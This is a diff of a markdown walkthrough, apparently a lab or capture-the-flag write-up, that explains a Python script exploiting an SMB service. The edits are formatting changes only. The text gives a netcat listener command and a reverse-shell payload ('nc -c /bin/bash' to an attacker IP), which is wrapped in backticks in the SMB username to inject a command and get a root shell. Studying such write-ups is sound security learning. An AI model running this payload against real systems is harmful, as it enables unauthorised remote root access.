@@ -60,12 +60,12 @@
 	- As we can see, we got a shell as root and we are able to run commands.
 
 - Script Exploitation
-	- I manually created a ([python script](./scripts/exploit.py)) to spawn a shell. Here is how it works
+	- I manually created a [python script](./scripts/exploit.py) to spawn a shell. Here is how it works
 		- Reverse Listener: This scripts assumes that the attacker is already listening on the supplied port. For eg. using `nc -lnvp 9001`
     	- Imports: The script uses the smb.SMBConnection for SMB communication and sys for accessing command-line arguments.
     	- Command-Line Arguments: Checks if the target IP and listener port are provided; if not, it prints usage instructions and exits.
     	- Variable Setup: Extracts the listener port and target IP from command-line arguments. 
-    	- Payload: `\`nc -c /bin/bash 192.168.1.6 {port}\`` Constructs a payload using nc (netcat) to open a reverse shell to the attacker's machine, embedding this payload in the username variable. You can replace this payload with your own if you want. The main thing here to notice is that the payload has to be enclosed within backticks [``].
+    	- Payload: ``` `nc -c /bin/bash 192.168.1.6 {port}` ``` Constructs a payload using nc (netcat) to open a reverse shell to the attacker's machine, embedding this payload in the username variable. You can replace this payload with your own if you want. The main thing here to notice is that the payload has to be enclosed within backticks [``].
     	- SMB Connection: Attempts to establish an SMB connection with the target using the crafted username as payload. It uses port 139, commonly associated with SMB services.
     	- Exception Handling: Catches and prints any errors encountered during the attempt to connect.
     	- Cleanup: Closes the SMB connection and prints a success message, indicating the script's completion.
